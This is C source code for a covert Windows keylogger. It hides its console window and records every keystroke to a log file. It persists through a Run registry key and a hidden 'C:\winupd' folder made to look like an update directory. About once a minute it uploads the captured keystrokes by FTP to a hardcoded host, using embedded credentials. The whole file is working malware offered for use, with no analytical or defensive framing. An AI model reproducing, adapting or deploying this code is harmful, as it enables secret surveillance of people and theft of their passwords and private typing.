/*
gcc conkeylog.c -o keycon.exe -DCURL_STATICLIB -I..\..\include -L..\..\lib -lcurl -lws2_32 -lwinmm

from doc/examples
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winuser.h>
#include <windowsx.h>

#include <curl/curl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#ifdef WIN32
#include <io.h>
#else
#include <unistd.h>
#endif

#define BUFSIZE 80
#define LOCAL_FILE		"key.log"
#define UPLOAD_FILE_AS	"keycur.log"
#define REMOTE_URL		"ftp://joebob:billy@192.168.77.8:21/" UPLOAD_FILE_AS


int test_key(void);
int create_key(char *);
int get_keys(void);

static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *stream)
{
  curl_off_t nread;

  size_t retcode = fread(ptr, size, nmemb, stream);

  nread = (curl_off_t)retcode;

  fprintf(stderr, "*** We read %" CURL_FORMAT_CURL_OFF_T
          " bytes from file\n", nread);
  return retcode;
}

//upload results of keylog file
int ftpup(void)
{
  CURL *curl;
  CURLcode res;
  FILE *hd_src;
  struct stat file_info;
  curl_off_t fsize;


  /* get the file size of the local file */
  if(stat(LOCAL_FILE, &file_info)) {
    printf("Couldnt open '%s': %s\n", LOCAL_FILE, strerror(errno));
    return 1;
  }
  fsize = (curl_off_t)file_info.st_size;

  printf("Local file size: %" CURL_FORMAT_CURL_OFF_T " bytes.\n", fsize);

  /* get a FILE * of the same file */
  hd_src = fopen(LOCAL_FILE, "rb");

  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);

  /* get a curl handle */
  curl = curl_easy_init();
  if(curl) {

    /* we want to use our own read function */
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);

    /* enable uploading */
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

    /* specify target */
    curl_easy_setopt(curl,CURLOPT_URL, REMOTE_URL);

    /* now specify which file to upload */
    curl_easy_setopt(curl, CURLOPT_READDATA, hd_src);

    /* Set the size of the file to upload (optional).  If you give a *_LARGE
       option you MUST make sure that the type of the passed-in argument is a
       curl_off_t. If you use CURLOPT_INFILESIZE (without _LARGE) you must
       make sure that to pass in a type 'long' argument. */
    curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,
                     (curl_off_t)fsize);

    /* Now run off and do what you've been told! */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));


    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  fclose(hd_src); /* close the local file */

  curl_global_cleanup();
  return 0;
}


int main(void)
{
	int debugmode;
	debugmode = 0; //setting to 1 will prevent window from disappearing.
	
	if (debugmode != 1)
	{
		HWND stealth; //creating stealth (window is not visible)
		AllocConsole();
		stealth = FindWindowA("ConsoleWindowClass", NULL);
		ShowWindow(stealth, 0);
	}
	

	int test, create;
	test = test_key();/*check if key is available for opening*/

	if (test == 2)/*create key*/
	{
		char *path = "C:\\winupd\\keycon.exe";/*the path in which the file needs to be*/
		create = create_key(path);
		printf("create: %d\n", create);

	}
	printf("test: %d\n", test);

	int t = get_keys();
	
	return t;
}

int get_keys(void)
{
	short character;
	long ftptimer; //sets up timer for ftp upload
	while (1) //loop indefinitely
	{
		
		Sleep(20); //to prevent 100% cpu usage
		for (character = 8; character <= 222; character++)
		{
			//Get key state
			if (GetAsyncKeyState(character) == -32767)
			{

				FILE *file;
				file = fopen("key.log", "a+");
				if (file == NULL)
				{
					return 1;
				}
				if (file != NULL)
				{
					if ((character >= 39) && (character <= 64))
					{
						fputc(character, file);
						fclose(file);
						break;
					}
					else if ((character>64) && (character<91))
					{
						character += 32;
						fputc(character, file);
						fclose(file);
						break;
					}
					else
					{
						//character names for non alphanumeric keys
						switch (character)
						{
						case VK_SPACE:
							fputc(' ', file);
							fclose(file);
							break;
						case VK_SHIFT:
							fputs("[SHIFT]", file);
							fclose(file);
							break;
						case VK_RETURN:
							fputs("\n[ENTER]", file);
							fclose(file);
							break;
						case VK_BACK:
							fputs("[BACKSPACE]", file);
							fclose(file);
							break;
						case VK_TAB:
							fputs("[TAB]", file);
							fclose(file);
							break;
						case VK_CONTROL:
							fputs("[CTRL]", file);
							fclose(file);
							break;
						case VK_DELETE:
							fputs("[DEL]", file);
							fclose(file);
							break;
						case VK_OEM_1:
							fputs("[;:]", file);
							fclose(file);
							break;
						case VK_OEM_2:
							fputs("[/?]", file);
							fclose(file);
							break;
						case VK_OEM_3:
							fputs("[`~]", file);
							fclose(file);
							break;
						case VK_OEM_4:
							fputs("[ [{ ]", file);
							fclose(file);
							break;
						case VK_OEM_5:
							fputs("[\\|]", file);
							fclose(file);
							break;
						case VK_OEM_6:
							fputs("[ ]} ]", file);
							fclose(file);
							break;
						case VK_OEM_7:
							fputs("['\"]", file);
							fclose(file);
							break;
						case VK_NUMPAD0:
							fputc('0', file);
							fclose(file);
							break;
						case VK_NUMPAD1:
							fputc('1', file);
							fclose(file);
							break;
						case VK_NUMPAD2:
							fputc('2', file);
							fclose(file);
							break;
						case VK_NUMPAD3:
							fputc('3', file);
							fclose(file);
							break;
						case VK_NUMPAD4:
							fputc('4', file);
							fclose(file);
							break;
						case VK_NUMPAD5:
							fputc('5', file);
							fclose(file);
							break;
						case VK_NUMPAD6:
							fputc('6', file);
							fclose(file);
							break;
						case VK_NUMPAD7:
							fputc('7', file);
							fclose(file);
							break;
						case VK_NUMPAD8:
							fputc('8', file);
							fclose(file);
							break;
						case VK_NUMPAD9:
							fputc('9', file);
							fclose(file);
							break;
						case VK_CAPITAL:
							fputs("[CAPS LOCK]", file);
							fclose(file);
							break;
						default:
							fclose(file);
							break;
						}
					}
				}
			}
		}
		ftptimer = ftptimer + 20;
		printf("ftptimer: %d\n", ftptimer);
		//run ftp every minute
		if ( ftptimer >= 60000 )
		{
			system("attrib h+ key.log");
			ftpup();
			ftptimer = 0;
		}
		
	}
	return EXIT_SUCCESS;
}

//checks to see if keys exist
int test_key(void)
{
	int check;
	HKEY hKey;
	char path[BUFSIZE];
	DWORD buf_length = BUFSIZE;
	int reg_key;

	reg_key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);
	printf("reg_key = %d", reg_key);
	if (reg_key != 0)
	{
		check = 1;
		return check;
	}

	reg_key = RegQueryValueEx(hKey, "key", NULL, NULL, (LPBYTE)path, &buf_length);

	if ((reg_key != 0) || (buf_length>BUFSIZE))
		check = 2;
	if (reg_key == 0)
		check = 0;

	RegCloseKey(hKey);
	return check;
}

//create key if key is not found
int create_key(char *path)
{
	int reg_key, check;

	HKEY hkey;

	reg_key = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	printf("create reg key = %d\n", reg_key);
	if (reg_key == 0)
	{
		RegSetValueEx((HKEY)hkey, "key", 0, REG_SZ, (BYTE *)path, strlen(path));
		system("mkdir C:\\winupd");
		system("copy keycon.exe C:\\winupd"); //copies keycon to C:
		system("attrib +h C:\\winupd\\keycon.exe");
		system("atrrib +h C:\\winupd");
		check = 0;
		return check;
	}
	if (reg_key != 0)
		check = 1;

	return check;
}